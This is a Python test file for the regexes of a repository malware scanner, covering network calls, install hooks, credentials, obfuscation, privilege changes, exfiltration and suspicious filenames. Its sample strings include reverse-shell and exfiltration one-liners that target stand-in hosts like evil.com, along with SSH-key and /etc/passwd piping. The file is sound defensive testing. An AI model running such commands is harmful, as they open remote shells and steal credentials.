"""Tests for detection regexes in patterns.py.

Each pattern category gets a test class with parametrized positive and negative cases.
These serve as regression tests — several patterns were tuned after real-world scanning
(e.g. "shell" → "webshell", "rat" requiring a separator, .devcontainer exclusion).
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
from patterns import (
    NETWORK_PATTERNS,
    INSTALL_HOOK_PATTERNS,
    CREDENTIAL_PATTERNS,
    OBFUSCATION_PATTERNS,
    PRIVILEGE_PATTERNS,
    EXFILTRATION_PATTERNS,
    SUSPICIOUS_FILENAMES,
)


# -- Helpers --

def find_pattern(patterns, name):
    """Look up a pattern dict by name from a pattern list."""
    for p in patterns:
        if p["name"] == name:
            return p
    raise ValueError(f"Pattern '{name}' not found")


def matches(pattern_dict, text):
    """Return True if the pattern matches and the exclude pattern does not suppress it."""
    m = pattern_dict["pattern"].search(text)
    if not m:
        return False
    exclude = pattern_dict.get("exclude_pattern")
    if exclude and exclude.search(text):
        return False
    return True


# ============================================================
# Network Patterns
# ============================================================

class TestHardcodedIP:
    pat = find_pattern(NETWORK_PATTERNS, "Hardcoded IP address")

    @pytest.mark.parametrize("text", [
        "connect to 8.8.8.8 for DNS",
        "server = '1.2.3.4'",
        "http://203.0.113.50/payload",
        "100.64.0.1",  # CGNAT range — not excluded (legitimately suspicious)
    ])
    def test_matches_public_ips(self, text):
        assert matches(self.pat, text)

    @pytest.mark.parametrize("text", [
        "localhost is 127.0.0.1",
        "bind to 0.0.0.0",
        "subnet 192.168.1.100",
        "internal 10.0.0.5",
        "docker 172.17.0.2",
        "broadcast 255.255.255.0",
    ])
    def test_excludes_private_ranges(self, text):
        assert not matches(self.pat, text)

    def test_no_match_on_plain_text(self):
        assert not matches(self.pat, "no IP addresses here")


class TestCurlWget:
    pat = find_pattern(NETWORK_PATTERNS, "Curl/wget to external URL")

    @pytest.mark.parametrize("text", [
        'curl https://evil.com/payload.sh',
        'wget -q https://example.com/install.sh',
        'curl -sSL https://get.docker.com',
        "CURL https://example.com/file",  # case insensitive
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)

    @pytest.mark.parametrize("text", [
        "curl_command = 'test'",
        "use wget for downloads",
    ])
    def test_no_match(self, text):
        assert not self.pat["pattern"].search(text)


class TestPythonRequests:
    pat = find_pattern(NETWORK_PATTERNS, "Python requests to non-standard URL")

    def test_matches_non_standard(self):
        assert self.pat["pattern"].search("requests.get('https://evil.com/data')")

    @pytest.mark.parametrize("text", [
        "requests.get('https://api.github.com/repos')",
        "requests.get('https://pypi.org/simple/')",
    ])
    def test_excludes_standard_apis(self, text):
        assert not self.pat["pattern"].search(text)


class TestNodeFetch:
    pat = find_pattern(NETWORK_PATTERNS, "Node fetch/axios to non-standard URL")

    def test_matches_fetch(self):
        assert self.pat["pattern"].search("fetch('https://evil.com/api')")

    def test_matches_axios(self):
        assert self.pat["pattern"].search("axios.get('https://evil.com/api')")

    def test_excludes_github_api(self):
        assert not self.pat["pattern"].search("fetch('https://api.github.com/repos')")


class TestDNSLookup:
    pat = find_pattern(NETWORK_PATTERNS, "DNS lookup / resolution")

    @pytest.mark.parametrize("text", [
        "dns.resolve('evil.com')",
        "dns.lookup('target.com')",
        "dig example.com",
        "nslookup target.com",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


# ============================================================
# Install Hook Patterns
# ============================================================

class TestNpmInstallHook:
    pat = find_pattern(INSTALL_HOOK_PATTERNS, "npm preinstall/postinstall script")

    @pytest.mark.parametrize("text", [
        '"postinstall": "node scripts/setup.js"',
        '"preinstall": "bash install.sh"',
        '"install": "python setup.py"',
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)

    def test_no_match_on_normal_scripts(self):
        # "start" and "test" are not install hooks for this pattern
        assert not self.pat["pattern"].search('"start": "node index.js"')


class TestNpmLifecycleNetwork:
    pat = find_pattern(INSTALL_HOOK_PATTERNS, "npm lifecycle script with network access")

    def test_matches(self):
        assert self.pat["pattern"].search('"postinstall": "curl https://evil.com"')

    def test_no_match_without_network(self):
        assert not self.pat["pattern"].search('"postinstall": "node setup.js"')


class TestSetupPyCmdclass:
    pat = find_pattern(INSTALL_HOOK_PATTERNS, "Python setup.py cmdclass override")

    def test_matches(self):
        assert self.pat["pattern"].search("cmdclass = {'install': CustomInstall}")

    def test_no_match_on_unrelated(self):
        assert not self.pat["pattern"].search("class MyInstaller:")


class TestSetupPySubprocess:
    pat = find_pattern(INSTALL_HOOK_PATTERNS, "Python setup.py with subprocess/os.system")

    @pytest.mark.parametrize("text", [
        "os.system('make install')",
        "os.popen('curl evil.com')",
        "Popen(['gcc', 'main.c'])",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)

    def test_subprocess_run_not_matched(self):
        """subprocess.run() is NOT matched — the pattern expects ( right after 'subprocess.'
        This is a known limitation; the pattern catches Popen(), os.system(), os.popen()."""
        assert not self.pat["pattern"].search("subprocess.run(['make'])")


class TestCargoBuildScript:
    pat = find_pattern(INSTALL_HOOK_PATTERNS, "Cargo build script")

    def test_matches(self):
        assert self.pat["pattern"].search('build = "build.rs"')

    def test_no_match_on_other_toml(self):
        assert not self.pat["pattern"].search('build = "false"')


class TestGitHubActionsPermissions:
    pat = find_pattern(INSTALL_HOOK_PATTERNS, "GitHub Actions workflow with dangerous permissions")

    def test_matches(self):
        text = "permissions:\n  contents: write"
        assert self.pat["pattern"].search(text)


# ============================================================
# Credential Patterns
# ============================================================

class TestSSHKeyAccess:
    pat = find_pattern(CREDENTIAL_PATTERNS, "SSH key file access")

    @pytest.mark.parametrize("text", [
        "~/.ssh/id_rsa",
        "/home/user/.ssh/id_ed25519",
        "/root/.ssh/authorized_keys",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestAWSCredentials:
    pat = find_pattern(CREDENTIAL_PATTERNS, "AWS credential patterns")

    @pytest.mark.parametrize("text", [
        "AKIAIOSFODNN7EXAMPLE =",
        "aws_secret_access_key = wJalrXUtnFEMI",
        "AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestHardcodedToken:
    pat = find_pattern(CREDENTIAL_PATTERNS, "Hardcoded API token/key pattern")

    def test_matches_real_looking_token(self):
        text = "api_key = 'ghp_ABCDefgh1234567890xyzw'"
        assert matches(self.pat, text)

    @pytest.mark.parametrize("text", [
        "api_key = 'your_api_key_here_placeholder'",
        "api_key = 'example_token_for_testing_only'",
        "api_key = 'test_fake_dummy_placeholder12'",
    ])
    def test_excludes_placeholders(self, text):
        assert not matches(self.pat, text)


class TestPrivateKeyBlock:
    pat = find_pattern(CREDENTIAL_PATTERNS, "Private key block")

    @pytest.mark.parametrize("text", [
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)

    def test_no_match_on_public_key(self):
        assert not self.pat["pattern"].search("-----BEGIN PUBLIC KEY-----")


class TestConnectionString:
    pat = find_pattern(CREDENTIAL_PATTERNS, "Password in connection string")

    def test_matches_remote_db(self):
        text = "postgres://admin:s3cret@db.prod.internal/mydb"
        assert matches(self.pat, text)

    @pytest.mark.parametrize("text", [
        "postgres://user:password@localhost/testdb",
        "mysql://root:pass@127.0.0.1/db",
        "redis://user:pass@example.com/0",  # exclude matches "example.com"
    ])
    def test_excludes_local_and_example(self, text):
        assert not matches(self.pat, text)


# ============================================================
# Obfuscation Patterns
# ============================================================

class TestLongBase64:
    pat = find_pattern(OBFUSCATION_PATTERNS, "Long base64 string")

    def test_matches_long_base64(self):
        # 120 chars of base64
        b64 = "A" * 120
        text = f'data = "{b64}"'
        assert matches(self.pat, text)

    def test_no_match_on_short_base64(self):
        text = '"SGVsbG8gV29ybGQ="'  # "Hello World" — too short
        assert not matches(self.pat, text)

    def test_excludes_image_data(self):
        b64 = "A" * 120
        text = f'data:image/png;base64,"{b64}"'
        assert not matches(self.pat, text)


class TestPythonEvalExec:
    pat = find_pattern(OBFUSCATION_PATTERNS, "Python eval/exec with string construction")

    @pytest.mark.parametrize("text", [
        "eval(base64.b64decode('payload'))",
        "exec(bytes.fromhex('deadbeef'))",
        "eval(codecs.decode('payload'))",
        "exec(compile('code', '<string>', 'exec'))",
        "eval(''.join(chars))",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestJSEval:
    pat = find_pattern(OBFUSCATION_PATTERNS, "JavaScript eval with string manipulation")

    @pytest.mark.parametrize("text", [
        "eval(atob('encoded'))",
        "eval(Buffer.from('data', 'base64'))",
        "eval(String.fromCharCode(72, 101))",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestCharCodeBuilding:
    pat = find_pattern(OBFUSCATION_PATTERNS, "Character code string building")

    def test_matches_many_char_codes(self):
        text = "String.fromCharCode(72, 101, 108, 108, 111, 32)"
        assert self.pat["pattern"].search(text)

    def test_no_match_on_few_char_codes(self):
        text = "String.fromCharCode(72, 101)"
        assert not self.pat["pattern"].search(text)


class TestHexPayload:
    pat = find_pattern(OBFUSCATION_PATTERNS, "Hex-encoded string execution")

    def test_matches(self):
        hex_str = "deadbeef" * 6  # 48 hex chars (> 40)
        text = f"bytes.fromhex('{hex_str}')"
        assert self.pat["pattern"].search(text)


class TestLongLine:
    pat = find_pattern(OBFUSCATION_PATTERNS, "Extremely long single line in source")

    def test_matches_1000_chars(self):
        text = "x" * 1001
        assert matches(self.pat, text)

    def test_excludes_minified(self):
        text = "// eslint-disable " + "x" * 1001
        assert not matches(self.pat, text)


# ============================================================
# Privilege Patterns
# ============================================================

class TestSudo:
    pat = find_pattern(PRIVILEGE_PATTERNS, "Sudo in script")

    def test_matches(self):
        assert self.pat["pattern"].search("sudo apt-get install")

    def test_no_match_without_space(self):
        assert not self.pat["pattern"].search("pseudocode")


class TestSetuid:
    pat = find_pattern(PRIVILEGE_PATTERNS, "Setuid/setgid calls")

    @pytest.mark.parametrize("text", [
        "setuid(0)",
        "setgid(0)",
        "seteuid(500)",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestChmodSetuid:
    pat = find_pattern(PRIVILEGE_PATTERNS, "Chmod with setuid bit")

    @pytest.mark.parametrize("text", [
        "chmod u+s /usr/bin/program",
        "chmod 4755 /usr/bin/program",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestKernelModules:
    pat = find_pattern(PRIVILEGE_PATTERNS, "Kernel module operations")

    @pytest.mark.parametrize("text", [
        "insmod rootkit.ko",
        "modprobe evil_module",
        "rmmod legit_module",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


# ============================================================
# Exfiltration Patterns
# ============================================================

class TestFilePipedToNetwork:
    pat = find_pattern(EXFILTRATION_PATTERNS, "File read piped to network tool")

    @pytest.mark.parametrize("text", [
        "cat /etc/passwd | curl -X POST https://evil.com",
        "cat ~/.ssh/id_rsa | nc evil.com 4444",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestNetcatListener:
    pat = find_pattern(EXFILTRATION_PATTERNS, "Netcat listener or reverse shell")

    @pytest.mark.parametrize("text", [
        "nc -l -p 4444",
        "nc -e /bin/bash evil.com 4444",
        "ncat -l 8080",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestBashReverseShell:
    pat = find_pattern(EXFILTRATION_PATTERNS, "Bash reverse shell pattern")

    @pytest.mark.parametrize("text", [
        "bash -i >& /dev/tcp/evil.com/4444 0>&1",
        "/dev/tcp/10.0.0.1/4444",
        "mkfifo /tmp/backpipe",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


class TestClipboardAccess:
    pat = find_pattern(EXFILTRATION_PATTERNS, "Clipboard access")

    @pytest.mark.parametrize("text", [
        "xclip -selection clipboard",
        "pbcopy < file.txt",
        "wl-copy < secret",
    ])
    def test_matches(self, text):
        assert self.pat["pattern"].search(text)


# ============================================================
# Suspicious Filenames
# ============================================================

class TestBinaryInSource:
    pat = find_pattern(SUSPICIOUS_FILENAMES, "Binary executable in source repo")

    @pytest.mark.parametrize("path", [
        "bin/helper.exe",
        "lib/native.dll",
        "vendor/lib.so",
        "tools/runner.bin",
    ])
    def test_matches(self, path):
        assert self.pat["pattern"].search(path)

    def test_git_dir_still_matches(self):
        """.git/ paths DO match the regex — the negative lookahead only works at the
        start anchor, not mid-path. In practice .git/ files are filtered out by the
        GitHub tree API (they're never in the response), not by this regex."""
        assert self.pat["pattern"].search(".git/objects/pack/pack-abc.bin")


class TestHiddenDirScripts:
    pat = find_pattern(SUSPICIOUS_FILENAMES, "Hidden directory with scripts")

    def test_matches_unknown_hidden_dir(self):
        assert matches(self.pat, ".secret/run.sh")

    @pytest.mark.parametrize("path", [
        ".github/workflows/ci.yml",  # not a script extension, but test the exclude
        ".github/scripts/deploy.sh",
        ".vscode/tasks.sh",
        ".devcontainer/setup.sh",
        ".husky/pre-commit",  # .husky is matched by .config exclude? No — but no .sh ext
    ])
    def test_excludes_known_config_dirs(self, path):
        """Known CI/editor config dirs should be excluded even if they contain scripts."""
        assert not matches(self.pat, path)


class TestBackdoorFilename:
    pat = find_pattern(SUSPICIOUS_FILENAMES, "Keylogger/backdoor filename")

    @pytest.mark.parametrize("path", [
        "src/keylogger.py",
        "tools/backdoor.sh",
        "rootkit/init.c",
        "exploit/poc.py",
        "webshell.php",
        "c2server.py",
        "rat_client/main.py",      # rat followed by underscore
        "utils/rat.py",            # rat followed by dot
        "stealer.exe",
    ])
    def test_matches(self, path):
        assert self.pat["pattern"].search(path)

    @pytest.mark.parametrize("path", [
        "src/rate_limiter.py",     # "rate" should NOT match "rat" — separator required
        "lib/ratchet.js",          # "ratchet" should NOT match
        "docs/migration.md",
        "src/strategy.py",
    ])
    def test_no_false_positives(self, path):
        """These were real false positive issues — 'rat' needs a separator after it."""
        assert not self.pat["pattern"].search(path)


class TestCryptoMiner:
    pat = find_pattern(SUSPICIOUS_FILENAMES, "Cryptocurrency miner indicators")

    @pytest.mark.parametrize("path", [
        "bin/xmrig",
        "tools/cpuminer",
        "cryptonight.so",
    ])
    def test_matches(self, path):
        assert self.pat["pattern"].search(path)


class TestEnvFileCheckedIn:
    pat = find_pattern(SUSPICIOUS_FILENAMES, "Environment file checked in")

    @pytest.mark.parametrize("path", [
        ".env",
        ".env.local",
        ".env.production",
        "config/.env.staging",
    ])
    def test_matches(self, path):
        assert self.pat["pattern"].search(path)

    @pytest.mark.parametrize("path", [
        ".envrc",            # direnv config, not .env
        ".env.example",      # template files are fine
        "test/.env.test",    # flagged anyway (per design decision) — test separately
    ])
    def test_no_match_on_non_env(self, path):
        assert not self.pat["pattern"].search(path)
